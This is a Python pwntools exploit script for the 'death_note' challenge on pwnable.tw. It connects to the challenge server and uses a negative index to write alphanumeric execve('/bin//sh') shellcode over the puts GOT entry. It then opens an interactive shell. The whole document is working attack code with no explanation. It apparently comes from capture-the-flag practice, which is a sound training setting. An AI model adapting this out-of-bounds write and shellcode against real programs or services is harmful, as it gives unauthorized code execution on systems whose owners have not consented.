from pwn import *
import time
elf = ELF("./death_note")
context.binary=elf
#target=process([elf.path])
target=remote('chall.pwnable.tw',10201)
#context.log_level='DEBUG'

def sla(string,val):
	target.sendlineafter(string,val)

def sa(string,val):
	target.sendafter(string,val)

def add(index,data):
	sla("choice :",str(1))	
	sla("Index :",str(index))
	sa("Name :",data)

note=0x804A060	
puts_got=0x804a020
shellcode="\x66\x35\x70\x37\x66\x35\x4D\x48\x50\x5B\x52\x5E\x66\x31\x5E\x28\x6A\x30\x58\x34\x30\x50"
shellcode+="\x68\x2F\x2f\x73\x68"
shellcode+="\x68\x2F\x62\x69\x6E\x54\x5B\x50\x5A\x34\x41\x34\x4A\x00"
add(-16,shellcode)


target.interactive()
